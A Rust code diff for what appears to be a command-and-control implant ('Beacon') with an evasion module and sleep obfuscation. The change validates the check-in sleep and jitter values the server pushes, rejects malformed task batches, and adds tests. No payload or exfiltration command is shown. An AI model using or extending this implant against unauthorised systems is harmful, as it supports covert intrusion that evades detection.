@@ -142,6 +142,51 @@ pub struct Beacon {
     started_at: std::time::Instant,
 }
 
+/// The protocol's cadence range.
+///
+/// `docs/PROTOCOL.md` §7.3 and the server (`hub.go:1119`) both say sleep is
+/// 1..86400 seconds and jitter 0..90 percent.
+const MIN_SLEEP: u64 = 1;
+const MAX_SLEEP: u64 = 86400;
+const MAX_JITTER: u64 = 90;
+
+/// The cadence a document asks for, given the one already in force.
+///
+/// A value outside the range is **ignored**, not clamped.  Clamping turns a
+/// broken `sleep: 0` into a one second beacon (the opposite of a quiet one)
+/// and a broken `sleep: 90000` into an accepted 25 hour nap; ignoring it
+/// leaves the beacon on the interval the operator last asked for.  The
+/// conversion to `u32` happens after the range check, so a value above
+/// `u32::MAX` can no longer wrap into the accepted range.
+fn policy_from(batch: &Value, sleep: u64, jitter: u32) -> (u64, u32) {
+    let want_sleep = batch.u64_or("sleep", sleep);
+    let sleep = if (MIN_SLEEP..=MAX_SLEEP).contains(&want_sleep) {
+        want_sleep
+    } else {
+        sleep
+    };
+    let want_jitter = batch.u64_or("jitter", jitter as u64);
+    let jitter = if want_jitter <= MAX_JITTER {
+        want_jitter as u32
+    } else {
+        jitter
+    };
+    (sleep, jitter)
+}
+
+/// The body of a `TASK_BATCH`, which has to be a map.
+///
+/// A batch whose body is an array used to be read as a batch with no tasks:
+/// every field lookup missed and every default applied, so a broken message
+/// became a valid empty one.  The reference (`wire.decode_body`) refuses a
+/// non-map body, and so does this.
+fn task_batch(body: Value) -> Result<Value, String> {
+    if !matches!(body, Value::Map(_)) {
+        return Err("TASK_BATCH is not a map".to_string());
+    }
+    Ok(body)
+}
+
 impl Beacon {
     pub fn new(cfg: Config) -> Self {
         let evade = crate::evade::load_state();
@@ -583,10 +628,8 @@ impl Beacon {
         self.session = Some(handshake.session);
 
         if let Some(cfg) = handshake.ack.get("cfg") {
-            let sleep = cfg.u64_or("sleep", self.cfg.sleep);
-            let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
             let obfuscate = cfg.bool_or("obf", self.cfg.sleep_obfuscate);
-            self.apply_policy(sleep, jitter);
+            self.apply_policy(cfg);
             self.cfg.sleep_obfuscate = obfuscate;
         }
         if let Some(ch) = self.channel.as_mut() {
@@ -604,13 +647,10 @@ impl Beacon {
         Ok(())
     }
 
-    fn apply_policy(&mut self, sleep: u64, jitter: u32) {
-        if sleep > 0 {
-            self.cfg.sleep = sleep;
-        }
-        if jitter <= 90 {
-            self.cfg.jitter = jitter;
-        }
+    fn apply_policy(&mut self, batch: &Value) {
+        let (sleep, jitter) = policy_from(batch, self.cfg.sleep, self.cfg.jitter);
+        self.cfg.sleep = sleep;
+        self.cfg.jitter = jitter;
     }
 
     /// Apply the route the server pushed.
@@ -746,7 +786,7 @@ impl Beacon {
                     cancelled.push(id);
                 }
                 wire::MSG_TASK_BATCH => {
-                    batch = body;
+                    batch = task_batch(body)?;
                     break;
                 }
                 wire::MSG_KILL => {
@@ -776,7 +816,7 @@ impl Beacon {
         self.send_heartbeat(task_count)?;
 
         // Server-side beacon policy wins over the compiled-in defaults.
-        self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
+        self.apply_policy(&batch);
         // The server also decides whether the check-in pattern is obfuscated.
         self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);
         // The route of the agent travels with the batch: the beacon learns
@@ -939,9 +979,7 @@ impl Beacon {
                     return Ok(false);
                 }
                 "sleep" => {
-                    let sleep = args.u64_or("sleep", self.cfg.sleep);
-                    let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
-                    self.apply_policy(sleep, jitter);
+                    self.apply_policy(&args);
                     let outcome = task::run(&self.context(), "sleep", &args);
                     self.send_result(&id, outcome)?;
                 }
@@ -1166,6 +1204,58 @@ fn uvarint_len(n: u64) -> usize {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The shared vectors, including the documents.
+    fn vectors() -> serde_json::Value {
+        let raw = include_str!("../../../contracts/vectors.json");
+        serde_json::from_str(raw).expect("vectors.json must be valid JSON")
+    }
+
+    fn document(case: &serde_json::Value) -> Value {
+        let text = case["hex"].as_str().expect("hex");
+        let raw: Vec<u8> = (0..text.len() / 2)
+            .map(|i| u8::from_str_radix(&text[2 * i..2 * i + 2], 16).expect("hex"))
+            .collect();
+        upk::decode_exact(&raw).expect("a document vector must be a upk value")
+    }
+
+    #[test]
+    fn the_batch_cadence_is_read_as_the_schema_says() {
+        let v = vectors();
+        let cases = v["documents"]["batch_policy"]
+            .as_array()
+            .expect("batch_policy");
+        assert!(!cases.is_empty(), "the policy vectors are missing");
+        for case in cases {
+            let name = case["name"].as_str().expect("name");
+            let base_sleep = case["base"]["sleep"].as_u64().expect("base.sleep");
+            let base_jitter = case["base"]["jitter"].as_u64().expect("base.jitter") as u32;
+            let (sleep, jitter) = policy_from(&document(case), base_sleep, base_jitter);
+            assert_eq!(
+                sleep,
+                case["expect"]["sleep"].as_u64().expect("expect.sleep"),
+                "{name}: sleep"
+            );
+            assert_eq!(
+                jitter as u64,
+                case["expect"]["jitter"].as_u64().expect("expect.jitter"),
+                "{name}: jitter"
+            );
+        }
+    }
+
+    #[test]
+    fn a_batch_that_is_not_a_map_is_refused() {
+        let v = vectors();
+        let case = &v["documents"]["batch_not_a_map"];
+        assert_eq!(case["expect"].as_str(), Some("reject"));
+        match task_batch(document(case)) {
+            Ok(_) => panic!("a batch whose body is an array was accepted"),
+            Err(e) => assert_eq!(e, "TASK_BATCH is not a map"),
+        }
+        // ... and the same rule leaves a real batch alone.
+        assert!(task_batch(upk::map(vec![("tasks", upk::arr(vec![]))])).is_ok());
+    }
 
     #[test]
     fn ct_eq_behaves() {
